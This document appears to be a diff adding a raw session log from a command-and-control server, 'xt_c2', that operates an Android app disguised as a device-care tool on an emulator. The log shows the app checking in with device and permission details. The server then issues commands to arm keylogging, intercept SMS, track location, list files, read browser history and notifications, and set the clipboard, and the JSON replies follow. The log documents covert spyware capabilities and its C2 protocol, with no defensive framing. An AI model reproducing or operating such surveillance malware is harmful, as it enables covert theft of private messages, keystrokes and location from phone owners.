@@ -1,0 +1,553 @@
+[*] xt_c2 listening on 0.0.0.0:8080  (batch=22 cmds)  save_dir=captures/
+
+[*] connection from 127.0.0.1:41248
+[*] hello from clientId=8c7f242174f3c58a
+    {"t": "hello", "v": 1, "clientId": "8c7f242174f3c58a", "model": "sdk_gphone64_x86_64", "manufacturer": "Google", "sdk": 34, "app": "2.1.0", "ts": 1793013795272, "storageOk": true, "appPrivateOk": true, "smsOk": true, "smsSendOk": true, "packagesOk": true, "contactsOk": true, "callLogOk": false, "cameraOk": false, "micOk": false, "deviceName": "sdk_gphone64_x86_64", "publicIp": "20.220.110.151", "os": "14", "battery": 100}
+
+== req_client_features ==
+{
+ "a11yEnabled": false,
+ "androidId": "8c7f242174f3c58a",
+ "cmds": [
+  "req_client_features",
+  "req_sim_info",
+  "req_wifi_info",
+  "req_sms_listen_start",
+  "req_sms_listen_stop",
+  "req_sms_listen_get",
+  "req_sms_listen_clear",
+  "req_screenshot",
+  "req_keylog_start",
+  "req_keylog_stop",
+  "req_keylog_get",
+  "req_keylog_clear",
+  "req_notifications_get",
+  "req_browser_history",
+  "req_location_track_start",
+  "req_location_track_stop",
+  "req_location_track_get",
+  "req_location_track_clear",
+  "req_app_action",
+  "req_foreground_app",
+  "req_fs_search",
+  "req_set_gateway",
+  "req_clipboard_set"
+ ],
+ "gateway": "10.0.2.2:8080",
+ "keylogA11yRunning": false,
+ "keylogArmed": false,
+ "manufacturer": "Google",
+ "model": "sdk_gphone64_x86_64",
+ "notifAccessEnabled": false,
+ "notifListenerRunning": false,
+ "ok": true,
+ "pkg": "com.dclabs.devicecare",
+ "rid": "e86b1879dccb",
+ "sdk": 34,
+ "smsArmed": true,
+ "t": "client_features",
+ "trackOn": false,
+ "v": 1,
+ "xtVersion": "2.1.0-xt"
+}
+
+== req_sim_info ==
+{
+ "dataState": 2,
+ "networkCountryIso": "us",
+ "networkOperator": "310260",
+ "networkOperatorName": "T-Mobile",
+ "ok": true,
+ "phoneNumber": "+15551234567",
+ "phoneType": 1,
+ "rid": "a21b6da57309",
+ "signal": {
+  "gsmRaw": 99
+ },
+ "simCountryIso": "us",
+ "simOperator": "310260",
+ "simOperatorName": "T-Mobile",
+ "simState": 5,
+ "t": "sim_info",
+ "v": 1,
+ "voiceMailNumber": "+15557654321"
+}
+
+== req_wifi_info ==
+{
+ "ok": true,
+ "rid": "22dd667c257c",
+ "t": "wifi_info",
+ "v": 1
+}
+
+== req_foreground_app ==
+{
+ "error": "not_found",
+ "ok": false,
+ "rid": "f2b22376877e",
+ "t": "foreground_app",
+ "v": 1
+}
+
+== req_screenshot ==
+{
+ "error": "capture_failed",
+ "ok": false,
+ "rid": "dd3bbdc1c2c8",
+ "t": "screenshot",
+ "v": 1
+}
+
+== req_keylog_start ==
+{
+ "a11yRunning": false,
+ "armed": true,
+ "hint": "accessibility_service_not_enabled",
+ "ok": true,
+ "rid": "5fc1e1984434",
+ "t": "keylog",
+ "v": 1
+}
+
+== req_keylog_get ==
+{
+ "armed": true,
+ "items": [],
+ "ok": true,
+ "rid": "da8ecbfd8bd7",
+ "t": "keylog",
+ "v": 1
+}
+
+== req_keylog_stop ==
+{
+ "armed": false,
+ "ok": true,
+ "rid": "700b970e9fb0",
+ "t": "keylog",
+ "v": 1
+}
+
+== req_sms_listen_start ==
+{
+ "armed": true,
+ "ok": true,
+ "rid": "880fe07f39e1",
+ "t": "sms_listen",
+ "v": 1
+}
+
+== req_sms_listen_get ==
+{
+ "armed": true,
+ "items": [],
+ "ok": true,
+ "rid": "039618360343",
+ "t": "sms_listen",
+ "v": 1
+}
+
+== req_notifications_get ==
+{
+ "enabled": false,
+ "items": [],
+ "ok": true,
+ "rid": "e0fc1bd60855",
+ "t": "notifications",
+ "v": 1
+}
+
+== req_location_track_start ==
+{
+ "intervalSec": 10,
+ "ok": true,
+ "rid": "d0e13704a0e7",
+ "t": "location_track",
+ "v": 1
+}
+
+== req_location_track_get ==
+{
+ "items": [
+  {
+   "start": true,
+   "ts": 1793013799147
+  }
+ ],
+ "ok": true,
+ "on": true,
+ "rid": "74be46a2add3",
+ "t": "location_track",
+ "v": 1
+}
+
+== req_location_track_stop ==
+{
+ "ok": true,
+ "on": false,
+ "rid": "fc99eaa2f33f",
+ "t": "location_track",
+ "v": 1
+}
+
+== req_browser_history ==
+{
+ "items": [],
+ "ok": true,
+ "rid": "2c1b630da48b",
+ "scanned": 0,
+ "t": "browser_history",
+ "total": 0,
+ "v": 1
+}
+
+== req_fs_search ==
+{
+ "items": [
+  {
+   "dir": true,
+   "mtime": 1793013228994,
+   "path": "/storage/emulated/0/Android",
+   "size": 4096
+  },
+  {
+   "dir": true,
+   "mtime": 1793013311366,
+   "path": "/storage/emulated/0/Android/data",
+   "size": 4096
+  },
+  {
+   "dir": true,
+   "mtime": 1793013258414,
+   "path": "/storage/emulated/0/Android/obb",
+   "size": 4096
+  },
+  {
+   "dir": true,
+   "mtime": 1793013228994,
+   "path": "/storage/emulated/0/Android/media",
+   "size": 4096
+  },
+  {
+   "dir": true,
+   "mtime": 1793013233014,
+   "path": "/storage/emulated/0/Music",
+   "size": 4096
+  },
+  {
+   "dir": true,
+   "mtime": 1793013258426,
+   "path": "/storage/emulated/0/Music/.thumbnails",
+   "size": 4096
+  },
+  {
+   "dir": false,
+   "mtime": 1793013233018,
+   "path": "/storage/emulated/0/Music/.thumbnails/.database_uuid",
+   "size": 36
+  },
+  {
+   "dir": false,
+   "mtime": 1793013258426,
+   "path": "/storage/emulated/0/Music/.thumbnails/.nomedia",
+   "size": 0
+  },
+  {
+   "dir": true,
+   "mtime": 1793013232826,
+   "path": "/storage/emulated/0/Podcasts",
+   "size": 4096
+  },
+  {
+   "dir": true,
+   "mtime": 1793013232826,
+   "path": "/storage/emulated/0/Ringtones",
+   "size": 4096
+  },
+  {
+   "dir": true,
+   "mtime": 1793013232826,
+   "path": "/storage/emulated/0/Alarms",
+   "size": 4096
+  },
+  {
+   "dir": true,
+   "mtime": 1793013232826,
+   "path": "/storage/emulated/0/Notifications",
+   "size": 4096
+  },
+  {
+   "dir": true,
+   "mtime": 1793013233018,
+   "path": "/storage/emulated/0/Pictures",
+   "size": 4096
+  },
+  {
+   "dir": true,
+   "mtime": 1793013258430,
+   "path": "/storage/emulated/0/Pictures/.thumbnails",
+   "size": 4096
+  },
+  {
+   "dir": false,
+   "mtime": 1793013233018,
+   "path": "/storage/emulated/0/Pictures/.thumbnails/.database_uuid",
+   "size": 36
+  },
+  {
+   "dir": false,
+   "mtime": 1793013258430,
+   "path": "/storage/emulated/0/Pictures/.thumbnails/.nomedia",
+   "size": 0
+  },
+  {
+   "dir": true,
+   "mtime": 1793013233018,
+   "path": "/storage/emulated/0/Movies",
+   "size": 4096
+  },
+  {
+   "dir": true,
+   "mtime": 1793013258434,
+   "path": "/storage/emulated/0/Movies/.thumbnails",
+   "size": 4096
+  },
+  {
+   "dir": false,
+   "mtime": 1793013233018,
+   "path": "/storage/emulated/0/Movies/.thumbnails/.database_uuid",
+   "size": 36
+  },
+  {
+   "dir": false,
+   "mtime": 1793013258434,
+   "path": "/storage/emulated/0/Movies/.thumbnails/.nomedia",
+   "size": 0
+  },
+  {
+   "dir": true,
+   "mtime": 1793013232826,
+   "path": "/storage/emulated/0/Download",
+   "size": 4096
+  },
+  {
+   "dir": true,
+   "mtime": 1793013232854,
+   "path": "/storage/emulated/0/DCIM",
+   "size": 4096
+  },
+  {
+   "dir": true,
+   "mtime": 1793013232858,
+   "path": "/storage/emulated/0/Documents",
+   "size": 4096
+  },
+  {
+   "dir": true,
+   "mtime": 1793013232866,
+   "path": "/storage/emulated/0/Audiobooks",
+   "size": 4096
+  },
+  {
+   "dir": true,
+   "mtime": 1793013232958,
+   "path": "/storage/emulated/0/Recordings",
+   "size": 4096
+  }
+ ],
+ "ok": true,
+ "path": "/storage/emulated/0",
+ "pattern": "*",
+ "rid": "6ecac9d3d01e",
+ "scanned": 25,
+ "t": "fs_search",
+ "truncated": false,
+ "v": 1
+}
+
+== req_fs_search ==
+{
+ "items": [
+  {
+   "dir": true,
+   "mtime": 1793013228994,
+   "path": "/storage/emulated/0/Android",
+   "size": 4096
+  },
+  {
+   "dir": true,
+   "mtime": 1793013311366,
+   "path": "/storage/emulated/0/Android/data",
+   "size": 4096
+  },
+  {
+   "dir": true,
+   "mtime": 1793013258414,
+   "path": "/storage/emulated/0/Android/obb",
+   "size": 4096
+  },
+  {
+   "dir": true,
+   "mtime": 1793013228994,
+   "path": "/storage/emulated/0/Android/media",
+   "size": 4096
+  },
+  {
+   "dir": true,
+   "mtime": 1793013233014,
+   "path": "/storage/emulated/0/Music",
+   "size": 4096
+  },
+  {
+   "dir": true,
+   "mtime": 1793013258426,
+   "path": "/storage/emulated/0/Music/.thumbnails",
+   "size": 4096
+  },
+  {
+   "dir": false,
+   "mtime": 1793013233018,
+   "path": "/storage/emulated/0/Music/.thumbnails/.database_uuid",
+   "size": 36
+  },
+  {
+   "dir": false,
+   "mtime": 1793013258426,
+   "path": "/storage/emulated/0/Music/.thumbnails/.nomedia",
+   "size": 0
+  },
+  {
+   "dir": true,
+   "mtime": 1793013232826,
+   "path": "/storage/emulated/0/Podcasts",
+   "size": 4096
+  },
+  {
+   "dir": true,
+   "mtime": 1793013232826,
+   "path": "/storage/emulated/0/Ringtones",
+   "size": 4096
+  },
+  {
+   "dir": true,
+   "mtime": 1793013232826,
+   "path": "/storage/emulated/0/Alarms",
+   "size": 4096
+  },
+  {
+   "dir": true,
+   "mtime": 1793013232826,
+   "path": "/storage/emulated/0/Notifications",
+   "size": 4096
+  },
+  {
+   "dir": true,
+   "mtime": 1793013233018,
+   "path": "/storage/emulated/0/Pictures",
+   "size": 4096
+  },
+  {
+   "dir": true,
+   "mtime": 1793013258430,
+   "path": "/storage/emulated/0/Pictures/.thumbnails",
+   "size": 4096
+  },
+  {
+   "dir": false,
+   "mtime": 1793013233018,
+   "path": "/storage/emulated/0/Pictures/.thumbnails/.database_uuid",
+   "size": 36
+  },
+  {
+   "dir": false,
+   "mtime": 1793013258430,
+   "path": "/storage/emulated/0/Pictures/.thumbnails/.nomedia",
+   "size": 0
+  },
+  {
+   "dir": true,
+   "mtime": 1793013233018,
+   "path": "/storage/emulated/0/Movies",
+   "size": 4096
+  },
+  {
+   "dir": true,
+   "mtime": 1793013258434,
+   "path": "/storage/emulated/0/Movies/.thumbnails",
+   "size": 4096
+  },
+  {
+   "dir": false,
+   "mtime": 1793013233018,
+   "path": "/storage/emulated/0/Movies/.thumbnails/.database_uuid",
+   "size": 36
+  },
+  {
+   "dir": false,
+   "mtime": 1793013258434,
+   "path": "/storage/emulated/0/Movies/.thumbnails/.nomedia",
+   "size": 0
+  },
+  {
+   "dir": true,
+   "mtime": 1793013232826,
+   "path": "/storage/emulated/0/Download",
+   "size": 4096
+  },
+  {
+   "dir": true,
+   "mtime": 1793013232854,
+   "path": "/storage/emulated/0/DCIM",
+   "size": 4096
+  },
+  {
+   "dir": true,
+   "mtime": 1793013232858,
+   "path": "/storage/emulated/0/Documents",
+   "size": 4096
+  },
+  {
+   "dir": true,
+   "mtime": 1793013232866,
+   "path": "/storage/emulated/0/Audiobooks",
+   "size": 4096
+  },
+  {
+   "dir": true,
+   "mtime": 1793013232958,
+   "path": "/storage/emulated/0/Recordings",
+   "size": 4096
+  }
+ ],
+ "ok": true,
+ "path": "/storage/emulated/0",
+ "pattern": "*",
+ "rid": "610450ee9955",
+ "scanned": 25,
+ "t": "fs_search",
+ "truncated": false,
+ "v": 1
+}
+
+== req_app_action ==
+{
+ "error": "unknown_action",
+ "ok": false,
+ "rid": "b9f8d3352a8e",
+ "t": "app_action",
+ "v": 1
+}
+
+== req_clipboard_set ==
+{
+ "len": 0,
+ "ok": true,
+ "rid": "2f134c682283",
+ "t": "clipboard_set",
+ "v": 1
+}
+
+== req_clipboard ==
+===
+ls: cannot access '/home/runner/xhunter-work/out/captures/': No such file or directory
